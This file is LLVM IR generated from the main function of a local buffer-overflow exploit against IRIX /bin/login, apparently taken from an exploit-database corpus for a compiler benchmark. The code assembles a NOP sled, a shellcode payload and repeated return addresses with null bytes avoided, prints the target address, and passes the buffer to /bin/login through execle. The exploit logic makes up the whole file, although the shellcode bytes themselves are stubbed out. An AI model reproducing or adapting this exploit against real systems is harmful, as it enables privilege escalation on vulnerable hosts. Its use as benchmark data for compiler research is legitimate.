; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_19310.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_19310.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@irix_shellcode = common dso_local global i32* null, align 8
@get_sp_code = common dso_local global i32 0, align 4
@buf = common dso_local global i32* null, align 8
@OFFSET = common dso_local global i32 0, align 4
@BUF_LENGTH = common dso_local global i32 0, align 4
@IRIX_NOP = common dso_local global i32 0, align 4
@EXTRA = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [32 x i8] c"stack = 0x%x, targ_addr = 0x%x\0A\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"/bin/login\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"login\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"-h\00", align 1
@.str.4 = private unnamed_addr constant [13 x i8] c"execl failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [1 x i8*], align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32 ()*, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %12 = bitcast [1 x i8*]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %12, i8 0, i64 8, i1 false)
  %13 = load i32*, i32** @irix_shellcode, align 8
  %14 = bitcast i32* %13 to i8*
  %15 = call i32 @strlen(i8* %14)
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %10, align 4
  %17 = load i32, i32* @get_sp_code, align 4
  %18 = sext i32 %17 to i64
  %19 = inttoptr i64 %18 to i32 ()*
  store i32 ()* %19, i32 ()** %11, align 8
  %20 = load i32 ()*, i32 ()** %11, align 8
  %21 = call i32 %20()
  store i32 %21, i32* %7, align 4
  %22 = load i32*, i32** @buf, align 8
  store i32* %22, i32** %8, align 8
  %23 = load i32, i32* %7, align 4
  %24 = load i32, i32* @OFFSET, align 4
  %25 = add nsw i32 %23, %24
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %3, align 4
  %27 = icmp sgt i32 %26, 1
  br i1 %27, label %28, label %35

28:                                               ; preds = %2
  %29 = load i8**, i8*** %4, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31)
  %33 = load i32, i32* %6, align 4
  %34 = add nsw i32 %33, %32
  store i32 %34, i32* %6, align 4
  br label %35

35:                                               ; preds = %28, %2
  br label %36

36:                                               ; preds = %54, %35
  %37 = load i32, i32* %6, align 4
  %38 = and i32 %37, -16777216
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %52, label %40

40:                                               ; preds = %36
  %41 = load i32, i32* %6, align 4
  %42 = and i32 %41, 16711680
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %52, label %44

44:                                               ; preds = %40
  %45 = load i32, i32* %6, align 4
  %46 = and i32 %45, 65280
  %47 = icmp eq i32 %46, 0
  br i1 %47, label %52, label %48

48:                                               ; preds = %44
  %49 = load i32, i32* %6, align 4
  %50 = and i32 %49, 255
  %51 = icmp eq i32 %50, 0
  br label %52

52:                                               ; preds = %48, %44, %40, %36
  %53 = phi i1 [ true, %44 ], [ true, %40 ], [ true, %36 ], [ %51, %48 ]
  br i1 %53, label %54, label %57

54:                                               ; preds = %52
  %55 = load i32, i32* %6, align 4
  %56 = add nsw i32 %55, 4
  store i32 %56, i32* %6, align 4
  br label %36

57:                                               ; preds = %52
  store i32 0, i32* %9, align 4
  br label %58

58:                                               ; preds = %71, %57
  %59 = load i32, i32* %9, align 4
  %60 = sext i32 %59 to i64
  %61 = load i32, i32* @BUF_LENGTH, align 4
  %62 = load i32, i32* %10, align 4
  %63 = sub nsw i32 %61, %62
  %64 = sext i32 %63 to i64
  %65 = udiv i64 %64, 4
  %66 = icmp ult i64 %60, %65
  br i1 %66, label %67, label %74

67:                                               ; preds = %58
  %68 = load i32, i32* @IRIX_NOP, align 4
  %69 = load i32*, i32** %8, align 8
  %70 = getelementptr inbounds i32, i32* %69, i32 1
  store i32* %70, i32** %8, align 8
  store i32 %68, i32* %69, align 4
  br label %71

71:                                               ; preds = %67
  %72 = load i32, i32* %9, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %9, align 4
  br label %58

74:                                               ; preds = %58
  store i32 0, i32* %9, align 4
  br label %75

75:                                               ; preds = %90, %74
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = load i32, i32* %10, align 4
  %79 = sext i32 %78 to i64
  %80 = udiv i64 %79, 4
  %81 = icmp ult i64 %77, %80
  br i1 %81, label %82, label %93

82:                                               ; preds = %75
  %83 = load i32*, i32** @irix_shellcode, align 8
  %84 = load i32, i32* %9, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i32, i32* %83, i64 %85
  %87 = load i32, i32* %86, align 4
  %88 = load i32*, i32** %8, align 8
  %89 = getelementptr inbounds i32, i32* %88, i32 1
  store i32* %89, i32** %8, align 8
  store i32 %87, i32* %88, align 4
  br label %90

90:                                               ; preds = %82
  %91 = load i32, i32* %9, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %9, align 4
  br label %75

93:                                               ; preds = %75
  store i32 0, i32* %9, align 4
  br label %94

94:                                               ; preds = %109, %93
  %95 = load i32, i32* %9, align 4
  %96 = sext i32 %95 to i64
  %97 = load i32, i32* @EXTRA, align 4
  %98 = sext i32 %97 to i64
  %99 = udiv i64 %98, 4
  %100 = icmp ult i64 %96, %99
  br i1 %100, label %101, label %112

101:                                              ; preds = %94
  %102 = load i32, i32* %6, align 4
  %103 = shl i32 %102, 24
  %104 = load i32, i32* %6, align 4
  %105 = ashr i32 %104, 8
  %106 = or i32 %103, %105
  %107 = load i32*, i32** %8, align 8
  %108 = getelementptr inbounds i32, i32* %107, i32 1
  store i32* %108, i32** %8, align 8
  store i32 %106, i32* %107, align 4
  br label %109

109:                                              ; preds = %101
  %110 = load i32, i32* %9, align 4
  %111 = add nsw i32 %110, 1
  store i32 %111, i32* %9, align 4
  br label %94

112:                                              ; preds = %94
  %113 = load i32*, i32** %8, align 8
  store i32 0, i32* %113, align 4
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %6, align 4
  %116 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0), i32 %114, i32 %115)
  %117 = load i32*, i32** @buf, align 8
  %118 = getelementptr inbounds i32, i32* %117, i64 1
  %119 = getelementptr inbounds [1 x i8*], [1 x i8*]* %5, i64 0, i64 0
  %120 = call i32 @execle(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32* %118, i32 0, i8** %119)
  %121 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0))
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @printf(i8*, i32, i32) #2

declare dso_local i32 @execle(i8*, i8*, i8*, i32*, i32, i8**) #2

declare dso_local i32 @perror(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
